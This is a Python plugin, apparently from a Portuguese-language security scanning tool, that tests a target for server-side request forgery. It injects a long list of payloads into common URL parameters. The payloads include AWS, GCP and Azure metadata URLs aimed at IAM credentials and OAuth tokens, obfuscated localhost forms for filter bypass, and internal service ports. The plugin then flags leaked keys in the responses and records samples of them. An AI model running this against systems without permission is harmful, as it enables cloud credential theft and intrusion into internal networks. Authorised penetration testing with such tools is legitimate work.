# plugins/ssrf_scanner.py
def run(target, ip, open_ports, banners):
    """
    Scanner SSRF (Server-Side Request Forgery).
    2026 Intel: CVE-2026-27795 (redirect bypass), CVE-2026-25960 (parser differential),
    CVE-2026-32019 (IPv4 special-use bypass), IMDSv2 token harvest, GCP metadata,
    Azure Managed Identity. Inclui DNS rebinding e mixed IP/domain formats.
    """
    import requests
    import time

    params = ["url", "link", "src", "href", "path", "file", "page", "site",
              "feed", "proxy", "callback", "redirect", "img", "image",
              "load", "fetch", "uri", "endpoint", "webhook", "dest"]

    # Cloud metadata + bypass techniques 2026
    internal_targets = [
        # AWS IMDSv1
        ("http://169.254.169.254/latest/meta-data/", "AWS_IMDSv1"),
        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS_IAM_CREDS"),
        ("http://169.254.169.254/latest/user-data/", "AWS_USER_DATA"),
        # GCP (requer header Metadata-Flavor)
        ("http://metadata.google.internal/computeMetadata/v1/project/project-id", "GCP_PROJECT"),
        ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "GCP_TOKEN"),
        # Azure IMDS
        ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "AZURE_IMDS"),
        # IP bypass 2026 — CVE-2026-32019 (IPv4 special-use)
        ("http://127.0.0.1/", "LOCALHOST"),
        ("http://0177.0.0.1/", "LOCALHOST_OCTAL"),
        ("http://2130706433/", "LOCALHOST_DECIMAL"),
        ("http://127.0.0.1.nip.io/", "DNS_REBINDING"),
        ("http://[::ffff:127.0.0.1]/", "IPV6_MAPPED"),
        ("http://[::1]/", "IPV6_LOOPBACK"),
        ("http://0x7f000001/", "LOCALHOST_HEX"),
        ("http://127.1/", "LOCALHOST_SHORT"),
        # Serviços internos
        ("http://127.0.0.1:22/", "SSH_INTERNAL"),
        ("http://127.0.0.1:3306/", "MYSQL_INTERNAL"),
        ("http://127.0.0.1:6379/", "REDIS_INTERNAL"),
        ("http://127.0.0.1:9200/", "ELASTICSEARCH"),
        ("http://127.0.0.1:8500/v1/agent/self", "CONSUL"),
        ("http://127.0.0.1:2379/version", "ETCD"),
        # Cloud internal ranges RFC 1918
        ("http://10.0.0.1/", "INTERNAL_10"),
        ("http://192.168.1.1/", "INTERNAL_192"),
        ("http://172.16.0.1/", "INTERNAL_172"),
    ]

    vulns = []

    for param in params:
        for internal_url, label in internal_targets:
            url = f"http://{target}/?{param}={internal_url}"
            try:
                start = time.time()
                resp = requests.get(url, timeout=8, allow_redirects=True)
                elapsed = time.time() - start

                # Indicadores SSRF por provider
                ssrf_indicators = {
                    "AWS": ["ami-id", "instance-id", "local-ipv4", "iam", "AccessKeyId", "SecretAccessKey"],
                    "GCP": ["computeMetadata", "google", "project-id", "access_token"],
                    "AZURE": ["vmId", "subscriptionId", "resourceGroupName"],
                    "SERVICES": ["SSH-", "MySQL", "redis_version", "elasticsearch", "consul", "etcd"],
                    "FILES": ["root:", "daemon:", "nobody:", "www-data:"],
                }

                for category, indicators in ssrf_indicators.items():
                    for indicator in indicators:
                        if indicator in resp.text:
                            sev = "CRITICO"
                            if "AccessKeyId" in resp.text or "SecretAccessKey" in resp.text:
                                sev = "CRITICO"
                                desc = "AWS CREDENTIALS EXPOSTAS via SSRF!"
                            elif "access_token" in resp.text:
                                sev = "CRITICO"
                                desc = "GCP OAuth Token exposto via SSRF!"
                            else:
                                desc = f"SSRF confirmado — {label}"

                            vulns.append({
                                "tipo": "SSRF",
                                "parametro": param,
                                "payload": internal_url,
                                "alvo_interno": label,
                                "indicador": indicator,
                                "severidade": sev,
                                "descricao": desc,
                                "tamanho_resposta": len(resp.text),
                                "amostra": resp.text[:250],
                            })
                            break
                    else:
                        continue
                    break

                # Time-based detection
                if elapsed > 5 and label.endswith("INTERNAL"):
                    vulns.append({
                        "tipo": "SSRF_TIME_BASED",
                        "parametro": param,
                        "payload": internal_url,
                        "alvo_interno": label,
                        "tempo": round(elapsed, 2),
                        "severidade": "MEDIO",
                    })

            except requests.Timeout:
                if "INTERNAL" in label:
                    vulns.append({
                        "tipo": "SSRF_TIMEOUT",
                        "parametro": param,
                        "alvo_interno": label,
                        "severidade": "BAIXO",
                    })
            except Exception:
                continue

    return {"plugin": "ssrf_scanner", "resultados": vulns if vulns else "Nenhuma vulnerabilidade SSRF detectada"}
